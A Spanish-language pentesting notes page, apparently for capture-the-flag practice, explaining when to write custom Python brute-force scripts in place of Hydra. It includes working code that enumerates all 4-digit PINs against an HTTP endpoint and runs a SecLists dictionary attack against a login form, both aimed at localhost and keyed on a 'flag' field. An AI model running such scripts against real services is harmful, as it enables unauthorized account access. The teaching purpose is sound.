---
icon: globe-www
---

# Ataques de fuerza bruta

> Cuando el objetivo no es un servicio estándar soportado por Hydra/Medusa (ej. un endpoint HTTP a medida, un PIN numérico, un token propietario), un script propio en Python suele ser más rápido de escribir que forzar el caso en una herramienta genérica.

### Caso: PIN numérico de 4 dígitos vía HTTP

Escenario típico: un endpoint `GET /pin?pin=XXXX` que responde con éxito y una flag/token si el PIN coincide, o error en caso contrario. Con solo 10,000 combinaciones posibles (0000-9999), la fuerza bruta es trivial.

```python
import requests

ip = "127.0.0.1"  # IP del objetivo
port = 1234       # Puerto del objetivo

for pin in range(10000):
    formatted_pin = f"{pin:04d}"  # 7 -> "0007"
    print(f"Attempted PIN: {formatted_pin}")

    response = requests.get(f"http://{ip}:{port}/pin?pin={formatted_pin}")

    if response.ok and 'flag' in response.json():
        print(f"Correct PIN found: {formatted_pin}")
        print(f"Flag: {response.json()['flag']}")
        break
```

Lógica: itera todos los PIN posibles, envía la petición GET con cada uno, y comprueba el código de estado (200) junto al contenido de la respuesta para detectar el acierto.

### Caso: ataque de diccionario vía HTTP (POST)

Escenario típico: un endpoint `POST /dictionary` que acepta una contraseña en el cuerpo del formulario y responde con éxito y flag/token si coincide.

```python
import requests

ip = "127.0.0.1"
port = 1234

# Descarga una wordlist directamente desde SecLists
passwords = requests.get(
    "https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Passwords/Common-Credentials/500-worst-passwords.txt"
).text.splitlines()

for password in passwords:
    print(f"Attempted password: {password}")

    response = requests.post(f"http://{ip}:{port}/dictionary", data={'password': password})

    if response.ok and 'flag' in response.json():
        print(f"Correct password found: {password}")
        print(f"Flag: {response.json()['flag']}")
        break
```

Lógica: descarga la wordlist en memoria (sin guardar archivo local), itera cada contraseña, envía POST con `password` como dato de formulario, y comprueba en la respuesta JSON si hay `flag`.

Ventaja de este patrón sobre Hydra en este caso: control total sobre el formato de la petición (JSON, form-data, headers custom) y de la condición de éxito (no solo código HTTP, también contenido de la respuesta).

### Cuándo escribir un script en vez de usar Hydra

| Situación                                                                                        | Recomendación                               |
| ------------------------------------------------------------------------------------------------ | ------------------------------------------- |
| Servicio estándar (SSH, FTP, HTTP form básico)                                                   | Hydra/Medusa                                |
| Endpoint HTTP con lógica de respuesta no estándar (JSON, tokens, headers custom)                 | Script propio con `requests`                |
| Espacio de búsqueda pequeño y bien definido (PIN, ID numérico)                                   | Script propio, generación directa del rango |
| Necesidad de encadenar lógica (extraer token de una respuesta y usarlo en la siguiente petición) | Script propio                               |

### Referencias cruzadas

* `fundamentos-de-fuerza-bruta` — tipos de ataque y matemática de combinaciones.
* `hydra` — herramienta genérica para servicios estándar.
